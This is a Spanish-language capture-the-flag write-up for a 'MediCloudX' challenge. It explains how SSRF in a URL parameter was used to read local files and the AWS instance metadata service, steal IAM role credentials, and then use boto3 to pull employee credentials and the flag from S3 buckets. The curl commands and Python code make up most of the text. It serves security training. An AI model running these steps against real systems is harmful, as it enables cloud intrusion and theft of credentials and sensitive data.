# Cómo Encontré la Flag - MediCloudX CTF

## 🎯 Flag Encontrada
```
CTF{m3d1cl0udx_d4t4_4n4lys1s_cr3d3nt14l_3xf1ltr4t10n}
```

---

## 📝 Resumen Ejecutivo

La flag se obtuvo explotando una vulnerabilidad **SSRF** (Server-Side Request Forgery) que permitió:
1. Acceder al servicio de metadatos de AWS
2. Robar credenciales IAM del servidor EC2
3. Acceder a buckets S3 y robar credenciales de empleados
4. Usar credenciales de empleado para acceder al bucket con la flag

---

## 🔍 Paso a Paso Detallado

### PASO 1: Descubrimiento de SSRF

La aplicación web tiene un "Verificador de Conectividad" con un parámetro `url`:

```
http://23.21.237.126/?url=<URL_A_CONSULTAR>
```

**Prueba simple:**
```bash
curl "http://23.21.237.126/?url=http://google.com"
```
✅ **Funciona** - La aplicación hace peticiones HTTP por nosotros (SSRF)

**Prueba con archivos locales:**
```bash
curl "http://23.21.237.126/?url=file:///etc/passwd"
```
✅ **Funciona** - También podemos leer archivos del sistema (LFI)

---

### PASO 2: Identificación del Servidor AWS

Leyendo `/var/www/html/index.php` y `/proc/self/status`, descubrí que:
- El servidor está en **AWS EC2**
- Hostname: `ip-10-0-1-245.ec2.internal`
- Corre como usuario `apache`

---

### PASO 3: Explotación del AWS Metadata Service

En AWS EC2, existe un servicio especial en `http://169.254.169.254` que expone información sensible del servidor.

**Listar qué hay disponible:**
```bash
curl "http://23.21.237.126/?url=http://169.254.169.254/latest/meta-data/"
```

**Descubrir el rol IAM:**
```bash
curl "http://23.21.237.126/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```
**Respuesta:** `ctf-25-ec2-data-analysis-role-l2808981`

**Robar las credenciales completas:**
```bash
curl "http://23.21.237.126/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ctf-25-ec2-data-analysis-role-l2808981"
```

**Credenciales obtenidas:**
```json
{
  "AccessKeyId": "ASIA5HCACCPUPSHC5LM7",
  "SecretAccessKey": "SECRET_REDACTED_BY_ANTIGRAVITY",
  "Token": "IQoJb3JpZ2luX2VjEMb//...[token largo]"
}
```

---

### PASO 4: Descubrimiento de Buckets S3

Leyendo el **user-data** del EC2 (script de inicialización):
```bash
curl "http://23.21.237.126/?url=http://169.254.169.254/latest/user-data"
```

En el script encontré referencias a dos buckets S3:
- `ctf-25-medicloudx-credentials-l2808981` 📁 Credenciales de empleados
- `ctf-25-medicloudx-patient-data-l2808981` 📁 Datos de pacientes

---

### PASO 5: Acceso a S3 con Credenciales del EC2

Instalé boto3 y usé las credenciales robadas:

```python
import boto3

s3 = boto3.client(
    's3',
    aws_access_key_id='ASIA5HCACCPUPSHC5LM7',
    aws_secret_access_key='SECRET_REDACTED_BY_ANTIGRAVITY',
    aws_session_token='IQoJb3JpZ2luX2VjEMb//...'
)

# Listar contenido del bucket de credenciales
response = s3.list_objects_v2(
    Bucket='ctf-25-medicloudx-credentials-l2808981'
)
```

**Archivos encontrados:**
- `employees/carlos.cardenas/carlos.cardenas.csv`
- `employees/daniel.lopez/aws-credentials.csv`

---

### PASO 6: Robo de Credenciales de Empleados

Descargué los archivos CSV que contenían credenciales AWS:

**carlos.cardenas.csv:**
```csv
User Name,Access Key Id,Secret Access Key
carlos.cardenas,AKIA_REDACTED_BY_ANTIGRAVITY,SECRET_REDACTED_BY_ANTIGRAVITY
```

**daniel.lopez/aws-credentials.csv:**
```csv
User Name,Access Key Id,Secret Access Key
daniel.lopez,AKIA_REDACTED_BY_ANTIGRAVITY,SECRET_REDACTED_BY_ANTIGRAVITY
```

---

### PASO 7: Escalación de Privilegios

Probé las credenciales de ambos empleados:

**Carlos Cardenas:** ❌ Permisos muy limitados, no puede acceder a S3

**Daniel Lopez:** ✅ ¡Permisos completos de S3!

```python
s3_daniel = boto3.client(
    's3',
    aws_access_key_id='AKIA_REDACTED_BY_ANTIGRAVITY',
    aws_secret_access_key='SECRET_REDACTED_BY_ANTIGRAVITY'
)

# Listar todos los buckets
buckets = s3_daniel.list_buckets()
```

**Buckets descubiertos (8 total):**
- aws-cloudtrail-logs-908519937000-8ed57a0d
- ctf-25-cognito-flag-ts0mp822
- ctf-25-cognito-web-ts0mp822
- ctf-25-medical-exporter-records-u145wnn0
- ctf-25-medicloudx-credentials-l2808981
- **ctf-25-medicloudx-patient-data-l2808981** ⭐
- ctf-25-terraform-state
- ctf-25-website-0a466b7c

---

### PASO 8: Recuperación de la Flag

Accedí al bucket de datos de pacientes:

```python
# Listar contenido
response = s3_daniel.list_objects_v2(
    Bucket='ctf-25-medicloudx-patient-data-l2808981'
)

# Archivos encontrados:
# - analytics/patient-insights/flag.txt ⭐⭐⭐
# - analytics/patient-insights/sample-data.csv
# - analytics/reports/monthly-health-trends.json
```

**Descargar la flag:**
```python
flag_obj = s3_daniel.get_object(
    Bucket='ctf-25-medicloudx-patient-data-l2808981',
    Key='analytics/patient-insights/flag.txt'
)

flag = flag_obj['Body'].read().decode('utf-8')
print(flag)
```

**Resultado:**
```
CTF{m3d1cl0udx_d4t4_4n4lys1s_cr3d3nt14l_3xf1ltr4t10n}
```

---

## 🔗 Cadena de Ataque Completa

```
1. SSRF en parámetro 'url'
   ↓
2. Acceso a AWS Metadata (169.254.169.254)
   ↓
3. Robo de credenciales IAM del EC2
   ↓
4. Acceso a S3 bucket 'credentials'
   ↓
5. Descarga de credenciales de empleados
   ↓
6. Credenciales de daniel.lopez = admin S3
   ↓
7. Acceso a bucket 'patient-data'
   ↓
8. Descarga de flag.txt
   ↓
9. ¡FLAG CAPTURADA! 🎉
```

---

## 💡 Lecciones Aprendidas

### Vulnerabilidades Explotadas:
1. **SSRF sin restricciones** - Permitió acceso a servicios internos
2. **AWS IMDSv1 habilitado** - Permitió robo de credenciales sin autenticación
3. **Credenciales en S3** - Credenciales almacenadas en texto plano
4. **Permisos IAM excesivos** - daniel.lopez tenía acceso S3 completo

### Herramientas Utilizadas:
- `curl` - Explotación SSRF
- `Python 3` + `boto3` - Interacción con AWS S3
- Análisis manual - Lectura de archivos de configuración

---

## 🎯 Flag Final

```
CTF{m3d1cl0udx_d4t4_4n4lys1s_cr3d3nt14l_3xf1ltr4t10n}
```

**Ubicación:** `s3://ctf-25-medicloudx-patient-data-l2808981/analytics/patient-insights/flag.txt`

**Credenciales usadas:** daniel.lopez (AKIA_REDACTED_BY_ANTIGRAVITY)

---

## 📌 Nota sobre el Hint "30 0 0"

El hint resultó ser un **red herring** (pista falsa). Inicialmente pensé que se refería a SQL injection con 30 columnas (`UNION SELECT 1,2,3,...,30`), pero la solución real fue completamente diferente: **SSRF → AWS → S3**.

No se requirió SQL injection en ningún momento.

---

**¡Desafío completado!** 🏆
